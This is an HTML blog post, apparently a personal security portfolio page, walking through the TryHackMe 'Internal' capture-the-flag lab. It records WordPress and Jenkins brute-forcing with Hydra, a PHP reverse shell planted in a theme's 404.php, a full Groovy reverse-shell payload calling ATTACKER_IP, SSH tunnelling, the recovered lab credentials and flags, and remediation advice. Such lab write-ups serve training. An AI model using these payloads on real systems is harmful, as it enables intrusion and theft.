@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Internal | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: Black-box pentest of a WordPress Ubuntu server. Hydra brute-forces WordPress admin credentials, Theme Editor 404.php PHP reverse shell for initial access as www-data, plaintext credentials in /opt/wp-save.txt for lateral movement to aubreanna, SSH tunnel exposes internal Jenkins, Hydra finds admin:spongebob, Groovy Script Console RCE, plaintext root credentials in Jenkins container, su to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/internal.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/internal.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Internal">
+<meta property="og:description" content="TryHackMe CTF: Black-box pentest of a WordPress Ubuntu server. Hydra brute-forces WordPress admin credentials, Theme Editor 404.php PHP reverse shell for initial access as www-data, plaintext credentials in /opt/wp-save.txt for lateral movement to aubreanna, SSH tunnel exposes internal Jenkins, Hydra finds admin:spongebob, Groovy Script Console RCE, plaintext root credentials in Jenkins container, su to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Internal">
+<meta name="twitter:description" content="TryHackMe CTF: Black-box pentest of a WordPress Ubuntu server. Hydra brute-forces WordPress admin credentials, Theme Editor 404.php PHP reverse shell for initial access as www-data, plaintext credentials in /opt/wp-save.txt for lateral movement to aubreanna, SSH tunnel exposes internal Jenkins, Hydra finds admin:spongebob, Groovy Script Console RCE, plaintext root credentials in Jenkins container, su to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Internal</h1>
+    <div class="post-description">TryHackMe CTF. A black-box penetration test against an internal environment scheduled for production release in three weeks. External, web app, and internal assessment. Two flags. Minimal information provided.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Pre-engagement scope</h2>
+
+<ul>
+<li>Black-box assessment: external, web app, and internal</li>
+<li>Two flags: <code>user.txt</code> and <code>root.txt</code></li>
+<li>Any tools or techniques permitted</li>
+<li>Locate and note all vulnerabilities found</li>
+<li>Modify <code>/etc/hosts</code> to reflect <code>internal.thm</code></li>
+<li>Only the assigned IP in scope</li>
+</ul>
+
+<h2>Evidence Log</h2>
+
+<table>
+<thead>
+<tr><th>Step</th><th>Finding</th><th>Impact</th></tr>
+</thead>
+<tbody>
+<tr><td>01</td><td>Hostname required</td><td>Virtual host routing</td></tr>
+<tr><td>02</td><td>Open services: SSH, HTTP</td><td>Attack surface</td></tr>
+<tr><td>03</td><td>WordPress deployment at <code>/blog/</code></td><td>Web attack surface</td></tr>
+<tr><td>04</td><td>WordPress admin credentials brute-forced</td><td>Authenticated CMS access</td></tr>
+<tr><td>05</td><td>Theme Editor RCE via 404.php</td><td>Initial access as www-data</td></tr>
+<tr><td>06</td><td>Plaintext credentials in <code>/opt/wp-save.txt</code></td><td>Lateral movement</td></tr>
+<tr><td>07</td><td>Internal Jenkins service on Docker network</td><td>Privilege escalation path</td></tr>
+<tr><td>08</td><td>Jenkins admin credentials brute-forced</td><td>Jenkins RCE</td></tr>
+<tr><td>09</td><td>Plaintext root credentials in Jenkins container</td><td>Full system compromise</td></tr>
+</tbody>
+</table>
+
+<h2>Pre-engagement setup</h2>
+
+<p>Target IP set as an environment variable:</p>
+
+<pre><code class="language-bash">export IP=TARGET_IP</code></pre>
+
+<p><code>/etc/hosts</code> entry:</p>
+
+<pre><code class="language-bash">echo "$IP internal.thm" | sudo tee -a /etc/hosts</code></pre>
+
+<p>Address resolution verified:</p>
+
+<pre><code class="language-bash">ping -c 1 internal.thm</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.22.22 AM.png" alt="ping -c 1 internal.thm confirming hostname resolves to target IP" style="max-width:100%;margin:2rem 0;">
+
+<p>Cleared to proceed.</p>
+
+<h2>Reconnaissance</h2>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV -p- -T4 -oA internal_initial $IP</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.27.09 AM.png" alt="Nmap scan results showing 22/tcp OpenSSH 7.6p1 and 80/tcp Apache 2.4.29" style="max-width:100%;margin:2rem 0;">
+
+<table>
+<thead>
+<tr><th>Finding</th><th>Evidence</th><th>Impact</th></tr>
+</thead>
+<tbody>
+<tr><td>SSH exposed</td><td>22/tcp OpenSSH 7.6p1</td><td>Remote login surface</td></tr>
+<tr><td>HTTP exposed</td><td>80/tcp Apache 2.4.29</td><td>Web attack surface</td></tr>
+<tr><td>Default Apache page</td><td><code>http-title: Apache2 Ubuntu Default Page</code></td><td>Web root may be hiding app paths</td></tr>
+</tbody>
+</table>
+
+<p>Web response confirmed via <code>hostname</code>:</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.30.49 AM.png" alt="curl to internal.thm returning Apache default page with server hostname" style="max-width:100%;margin:2rem 0;">
+
+<p>Header check:</p>
+
+<pre><code class="language-bash">whatweb http://internal.thm
+curl -I http://internal.thm</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.34.46 AM.png" alt="whatweb output for internal.thm showing Apache and Ubuntu" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.35.32 AM.png" alt="curl -I headers for internal.thm showing Apache 2.4.29 response" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Next step:</strong> directory enumeration.</p>
+
+<h2>Directory enumeration</h2>
+
+<pre><code class="language-bash">gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o internal_gobuster.txt</code></pre>
+
+<p>While gobuster runs, quick checks for common files:</p>
+
+<pre><code class="language-bash">curl -i http://internal.thm/robots.txt
+curl -i http://internal.thm/sitemap.xml</code></pre>
+
+<p>Both 404.</p>
+
+<p>gobuster partial results:</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.37.05 AM.png" alt="gobuster partial results showing /blog and /wordpress as discovered paths" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/blog</code> and <code>/wordpress</code> are high-probability targets.</p>
+
+<p>Headers pulled on each:</p>
+
+<pre><code class="language-bash">curl -I http://internal.thm/blog/
+curl -I http://internal.thm/wordpress/</code></pre>
+
+<p><strong>Next step:</strong> WordPress fingerprinting on <code>/blog/</code>.</p>
+
+<h2>WordPress enumeration</h2>
+
+<pre><code class="language-bash">nmap -sV --script http-wordpress-enum $IP</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.47.37 AM.png" alt="nmap http-wordpress-enum script results for internal.thm" style="max-width:100%;margin:2rem 0;">
+
+<p>More targeted:</p>
+
+<pre><code class="language-bash">nmap -Pn -p80 --script http-wordpress-enum,http-wordpress-users,http-wordpress-brute \
+  --script-args http-wordpress-enum.root=/blog/,http-wordpress-users.root=/blog/ \
+  internal.thm</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.49.18 AM.png" alt="Targeted nmap WordPress scan showing /blog/ path, akismet plugin, and installed themes" style="max-width:100%;margin:2rem 0;">
+
+<p>Current findings:</p>
+<ul>
+<li>WordPress path: <code>/blog/</code></li>
+<li>Plugin: <code>akismet</code></li>
+<li>Themes: <code>twentyseventeen</code>, <code>twentynineteen</code>, <code>twentytwenty</code></li>
+</ul>
+
+<p>WordPress login page confirmed:</p>
+
+<pre><code class="language-bash">curl -I http://internal.thm/blog/wp-login.php</code></pre>
+
+<p>REST API user enumeration:</p>
+
+<pre><code class="language-bash">curl -s http://internal.thm/blog/index.php/wp-json/wp/v2/users/ | jq</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 7.56.57 AM.png" alt="WordPress REST API user enumeration returning admin username and ID" style="max-width:100%;margin:2rem 0;">
+
+<p>Username <code>admin</code> confirmed via REST API. wpscan terminated (hung). Switching to <code>hydra</code>.</p>
+
+<h2>WordPress brute force</h2>
+
+<p>Initial attempt using <code>Invalid username</code> as the failure string produced false positives because <code>admin</code> was a valid username. Failure condition corrected to match WordPress invalid-password response:</p>
+
+<pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=Invalid username"</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 8.03.42 AM.png" alt="Initial Hydra attempt with incorrect failure string producing false positives" style="max-width:100%;margin:2rem 0;">
+
+<p>Corrected failure string:</p>
+
+<pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=The password you entered"</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 8.13.22 AM.png" alt="Hydra with corrected failure string finding WordPress credentials admin:my2boys" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Credentials:</strong> <code>admin:my2boys</code></p>
+
+<h2>Initial access via WordPress Theme Editor</h2>
+
+<p>Logged in to WordPress admin at <code>http://internal.thm/blog/wp-login.php</code>.</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 8.45.40 AM.png" alt="WordPress admin dashboard after successful login as admin" style="max-width:100%;margin:2rem 0;">
+
+<p>Navigated to Theme Editor at <code>http://internal.thm/blog/wp-admin/theme-editor.php</code>.</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 8.51.06 AM.png" alt="WordPress Theme Editor with 404.php selected for editing" style="max-width:100%;margin:2rem 0;">
+
+<p>On the attack machine, prepared a PHP reverse shell:</p>
+
+<pre><code class="language-bash">cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+nano shell.php</code></pre>
+
+<p>Modified the two values marked <code>CHANGE THIS</code> to ATTACKER_IP and port 4444:</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 8.58.36 AM.png" alt="PHP reverse shell with ATTACKER_IP and port 4444 configured" style="max-width:100%;margin:2rem 0;">
+
+<p>Started the listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+<p>In a second terminal, displayed shell.php for copy/paste:</p>
+
+<pre><code class="language-bash">cat shell.php</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.02.22 AM.png" alt="cat shell.php output displaying full PHP reverse shell contents for copy/paste" style="max-width:100%;margin:2rem 0;">
+
+<p>Selected the entire contents of WordPress&rsquo;s <code>404.php</code> in the Theme Editor, replaced with <code>shell.php</code>, and clicked Update File.</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.04.09 AM.png" alt="WordPress Theme Editor with PHP reverse shell pasted into 404.php ready to save" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.04.38 AM.png" alt="WordPress Theme Editor showing File Updated confirmation after saving 404.php" style="max-width:100%;margin:2rem 0;">
+
+<p>Triggered the shell:</p>
+
+<pre><code class="language-bash">curl http://internal.thm/blog/index.php/this-page-does-not-exist</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.06.21 AM.png" alt="curl triggering the 404 URL to execute the reverse shell in 404.php" style="max-width:100%;margin:2rem 0;">
+
+<p>Shell caught on port 4444.</p>
+
+<pre><code class="language-bash">whoami
+hostname
+id</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.07.27 AM.png" alt="Netcat listener catching shell, whoami and id confirming www-data on internal" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Initial access confirmed as <code>www-data</code> on <code>internal</code>.</strong></p>
+
+<p>WordPress administrative access allowed modification of theme PHP files. A reverse shell was placed in <code>404.php</code> and triggered through the web application, resulting in command execution as <code>www-data</code>.</p>
+
+<p>Shell stabilization:</p>
+
+<pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.19.40 AM.png" alt="Shell stabilized with python3 pty and TERM=xterm set" style="max-width:100%;margin:2rem 0;">
+
+<h2>Local enumeration</h2>
+
+<pre><code class="language-bash">pwd
+ls -la
+ls -la /home</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.23.54 AM.png" alt="pwd, ls -la, and ls -la /home showing aubreanna home directory" style="max-width:100%;margin:2rem 0;">
+
+<p>WordPress config location:</p>
+
+<pre><code class="language-bash">find /var/www -name wp-config.php 2>/dev/null
+cat /var/www/html/wordpress/wp-config.php</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.25.40 AM.png" alt="find locating wp-config.php at /var/www/html/wordpress/wp-config.php" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.28.25 AM.png" alt="wp-config.php contents showing DB_USER wordpress and DB_PASSWORD wordpress123" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Finding:</strong> WordPress database credentials exposed in <code>/var/www/html/wordpress/wp-config.php</code>.</p>
+<ul>
+<li><code>DB_USER: wordpress</code></li>
+<li><code>DB_PASSWORD: wordpress123</code></li>
+</ul>
+
+<pre><code class="language-bash">cd /opt
+ls -la
+cat wp-save.txt</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.31.53 AM.png" alt="/opt directory listing and cat wp-save.txt revealing aubreanna:bubb13guM!@#123 in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<p>I wonder if this is Juwanna Man Bill from the previous engagement. Bill gets pwned quite a bit.</p>
+
+<p><strong>Finding:</strong> Plaintext credential file discovered at <code>/opt/wp-save.txt</code>.</p>
+<ul>
+<li><code>aubreanna:bubb13guM!@#123</code></li>
+</ul>
+
+<h2>Lateral movement to aubreanna</h2>
+
+<pre><code class="language-bash">ssh aubreanna@internal.thm</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.42.59 AM.png" alt="SSH login as aubreanna to internal.thm succeeding with recovered credentials" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">whoami
+hostname
+pwd
+ls -la</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.43.59 AM.png" alt="whoami, hostname, pwd, and ls -la as aubreanna showing home directory contents" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cat user.txt</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.52.36 AM.png" alt="cat user.txt showing user flag THM{int3rna1_fl4g_1}" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>User flag:</strong> <code>THM{int3rna1_fl4g_1}</code></p>
+
+<p>Continued enumeration:</p>
+
+<pre><code class="language-bash">cat jenkins.txt</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 9.55.29 AM.png" alt="cat jenkins.txt revealing Jenkins is running internally at 172.17.0.2:8080" style="max-width:100%;margin:2rem 0;">
+
+<p>Jenkins is running internally at <code>172.17.0.2:8080</code>. Attempting to access directly in-browser at <code>http://127.0.0.1:8080</code> first:</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 10.13.29 AM.png" alt="Browser showing port 8080 is occupied locally by Burp Suite, not Jenkins" style="max-width:100%;margin:2rem 0;">
+
+<p>Never judge a book by its cover. Port 8080 is occupied locally by Burp Suite.</p>
+
+<p>Curl to confirm the Jenkins container directly:</p>
+
+<pre><code class="language-bash">curl -I http://172.17.0.2:8080</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 10.13.17 AM.png" alt="curl -I to Jenkins container at 172.17.0.2:8080 returning HTTP 403 and Jenkins headers" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Present validation chain:</strong><br>
+<code>nmap &rarr; gobuster &rarr; /blog WordPress &rarr; admin enum &rarr; admin:my2boys &rarr; WP theme shell &rarr; www-data &rarr; /opt/wp-save.txt &rarr; aubreanna &rarr; user.txt</code></p>
+
+<h2>SSH tunnel to Jenkins</h2>
+
+<p>From the attack machine, open a third SSH session with local port forwarding:</p>
+
+<pre><code class="language-bash">ssh -L 9090:172.17.0.2:8080 aubreanna@internal.thm</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 10.35.38 AM.png" alt="SSH local port forwarding command binding localhost:9090 to the Jenkins container" style="max-width:100%;margin:2rem 0;">
+
+<p>Enter aubreanna&rsquo;s password and leave this session open. Jenkins is now accessible in-browser at:</p>
+
+<pre><code>http://127.0.0.1:9090</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 10.49.20 AM.png" alt="Browser showing Jenkins login page accessible at 127.0.0.1:9090 via SSH tunnel" style="max-width:100%;margin:2rem 0;">
+
+<p>Hello, old friend.</p>
+
+<h2>Jenkins brute force</h2>
+
+<pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 9090 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password"</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.00.13 AM.png" alt="Hydra brute force finding Jenkins credentials admin:spongebob" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Credentials:</strong> <code>admin:spongebob</code></p>
+
+<h2>Jenkins Script Console RCE</h2>
+
+<p>Logged in to the Jenkins UI.</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.01.48 AM.png" alt="Jenkins dashboard after successful admin login" style="max-width:100%;margin:2rem 0;">
+
+<p>Navigated to Manage Jenkins &gt; Script Console.</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.04.18 AM.png" alt="Jenkins Manage Jenkins page with Script Console option highlighted" style="max-width:100%;margin:2rem 0;">
+
+<p>New listener on port 5555:</p>
+
+<pre><code class="language-bash">nc -lvnp 5555</code></pre>
+
+<p>Groovy reverse shell payload pasted into the Script Console:</p>
+
+<pre><code class="language-groovy">String host="ATTACKER_IP";
+int port=5555;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(), so=s.getOutputStream();
+while(!s.isClosed()){
+  while(pi.available()&gt;0)so.write(pi.read());
+  while(pe.available()&gt;0)so.write(pe.read());
+  while(si.available()&gt;0)po.write(si.read());
+  so.flush();
+  po.flush();
+  Thread.sleep(50);
+  try {p.exitValue(); break;} catch (Exception e){}
+}
+p.destroy();
+s.close();</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.06.58 AM.png" alt="Groovy reverse shell payload in Jenkins Script Console ready to run" style="max-width:100%;margin:2rem 0;">
+
+<p>Clicked Run.</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.07.49 AM.png" alt="Jenkins Script Console after clicking Run, execution initiated" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">whoami
+hostname
+id</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.21.35 AM.png" alt="Netcat listener catching Jenkins shell, whoami confirming jenkins user inside container" style="max-width:100%;margin:2rem 0;">
+
+<p>Shell confirmed inside the Jenkins container. Shell stabilization (python3 unavailable):</p>
+
+<pre><code class="language-bash">python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<pre><code class="language-bash">ls -la /opt
+cat /opt/note.txt</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.24.20 AM.png" alt="cat /opt/note.txt inside Jenkins container revealing root:tr0ub13guM!@#123 in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Finding:</strong> Plaintext root credentials stored at <code>/opt/note.txt</code> inside the Jenkins container.</p>
+<ul>
+<li><code>root:tr0ub13guM!@#123</code></li>
+</ul>
+
+<h2>Root flag</h2>
+
+<p>Back to the aubreanna SSH session:</p>
+
+<pre><code class="language-bash">su root</code></pre>
+
+<p>Enter the root password.</p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.27.24 AM.png" alt="su root in the aubreanna SSH session accepting the root password from /opt/note.txt" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">ls -la /root
+cat /root/root.txt</code></pre>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.28.06 AM.png" alt="ls -la /root and cat /root/root.txt showing root flag THM{d0ck3r_d3str0y3r}" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>THM{d0ck3r_d3str0y3r}</code></p>
+
+<img src="/images/internal/Screenshot 2026-06-09 at 11.28.51 AM.png" alt="Final confirmation screenshot of root shell with root flag retrieved" style="max-width:100%;margin:2rem 0;">
+
+<h2>Final exploit chain</h2>
+
+<pre><code>Nmap
+  -&gt; 22/80 only
+  -&gt; /etc/hosts internal.thm
+  -&gt; gobuster found /blog and /wordpress
+  -&gt; WordPress at /blog/
+  -&gt; REST API user enum found admin
+  -&gt; Hydra: admin:my2boys
+  -&gt; wp-admin access
+  -&gt; Theme Editor 404.php reverse shell
+  -&gt; www-data shell
+  -&gt; /opt/wp-save.txt: aubreanna:bubb13guM!@#123
+  -&gt; SSH as aubreanna
+  -&gt; user.txt
+  -&gt; jenkins.txt revealed 172.17.0.2:8080
+  -&gt; SSH tunnel to Jenkins on 9090
+  -&gt; Hydra: admin:spongebob
+  -&gt; Jenkins Script Console Groovy RCE
+  -&gt; jenkins container shell
+  -&gt; /opt/note.txt: root:tr0ub13guM!@#123
+  -&gt; su root
+  -&gt; root.txt</code></pre>
+
+<hr>
+
+<h2>Key report findings</h2>
+
+<ul>
+<li>Exposed SSH and HTTP services</li>
+<li>Default Apache page exposed, obscuring application paths</li>
+<li>WordPress deployment discovered under <code>/blog/</code></li>
+<li>WordPress REST API user enumeration disclosed <code>admin</code></li>
+<li>WordPress admin password vulnerable to brute force</li>
+<li>WordPress Theme Editor allowed PHP code execution</li>
+<li>Plaintext credentials stored in <code>/opt/wp-save.txt</code></li>
+<li>Internal Jenkins service exposed on Docker network</li>
+<li>Jenkins admin password vulnerable to brute force</li>
+<li>Jenkins Script Console allowed remote command execution</li>
+<li>Plaintext root credentials stored inside Jenkins container at <code>/opt/note.txt</code></li>
+</ul>
+
+<h2>Remediation summary</h2>
+
+<ul>
+<li>Disable WordPress REST API user enumeration or restrict to authenticated users</li>
+<li>Enforce strong, unique passwords on all administrative accounts</li>
+<li>Remove Theme Editor access from production WordPress deployments</li>
+<li>Remove plaintext credential files from web-accessible directories and container volumes</li>
+<li>Isolate internal services on Docker networks from SSH-accessible user accounts</li>
+<li>Restrict Jenkins Script Console access; enforce role-based access controls</li>
+<li>Rotate all credentials discovered during assessment</li>
+</ul>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
